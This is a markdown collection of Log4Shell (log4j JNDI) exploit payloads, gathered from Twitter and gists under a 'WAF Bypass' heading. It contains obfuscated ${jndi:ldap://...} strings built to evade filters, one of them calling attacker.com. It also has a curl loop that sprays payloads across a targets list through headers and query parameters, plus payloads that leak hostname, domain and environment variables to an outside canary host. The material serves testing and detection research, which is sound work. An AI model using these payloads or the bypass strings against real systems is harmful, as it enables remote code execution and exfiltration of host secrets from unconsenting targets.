## Payloads / Obfuscation / WAF Bypass
| URL | Info |
| --- | --- |
| https://gist.github.com/ZephrFish/32249cae56693c1e5484888267d07d39 | log4j payloads |
| https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a | log4j-keywords |

#### Social Media Payload Responses
If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:
```c
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
```
// attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.

Source: https://twitter.com/Rezn0k/status/1469523006015750146?s=09

---

There may be many ways to avoid detection :(
```c
jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::}
```

Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09

---

1. `${jndi:ldap://127.0.0.1:1389/ badClassName}`
2. `${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}`
3. `${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}`
4. `${jndi:rmi://adsasd.asdasd.asdasd}`

Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09

#### Canary Token Testing

| URL | Info |
| --- | --- |
| https://twitter.com/thinkstcanary/status/1469439743905697797?s=21 | Twitter - Thinkst Canary Advisory |

```c
cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```
```c
${jndi:ldap://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}..[L4J.TOKEN.canarytokens.com/a](http://l4j.TOKEN.canarytokens.com/a)}  
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.[L4J.TOKEN.canarytokens.com/a})@foobar.com](http://l4j.TOKEN.canarytokens.com/a%7D)@foobar.com)
```
RFC conform Email Payload:
```c
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.L4J.TOKEN.canarytokens.com/a})@foobar.com
```

Triggering the Canary Token by using User-Agent Switcher:

URL: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/

Payload: `${jndi:ldap://TOKEN.canarytokens.com/a}`

Fire in the hole aka start browsing the web!
